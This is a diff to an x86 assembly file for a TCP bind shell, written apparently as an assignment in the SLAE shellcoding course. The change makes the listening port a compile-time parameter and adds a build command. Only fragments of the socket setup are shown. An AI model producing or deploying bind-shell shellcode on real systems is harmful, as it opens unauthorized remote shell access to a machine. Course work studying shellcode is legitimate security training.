@@ -1,12 +1,14 @@
 ; bind.nasm - A TCP Bind Shell
 ; Assignment 1 of SLAE course
-; 2018-06-21 Thomas Karpiniec 
+; 2018-06-21 Thomas Karpiniec
+
+; Compile with chosen port in network byte order, e.g. 4444:
+;     nasm -f elf32 -o bind.o -DLISTEN_PORT=0x5c11 bind.nasm
 
 global _start
 
        AF_INET		equ 2
        SOCK_STREAM 	equ 1
-       PORT_4444_NBO 	equ 0x5c11
        SYS_SOCKET 	equ 359
        SYS_BIND 	equ 361
        SYS_LISTEN	equ 363
@@ -29,7 +31,7 @@ _start:
 	push eax		; 4 bytes zero padding
 	push eax	    	; 4 bytes zero padding
 	push eax	    	; sin_addr = 0x00000000 = INADDR_ANY
-	push word PORT_4444_NBO	; sin_port
+	push word LISTEN_PORT	; sin_port
 	push word AF_INET	; sin_family
 	
 	; Bind interface and port
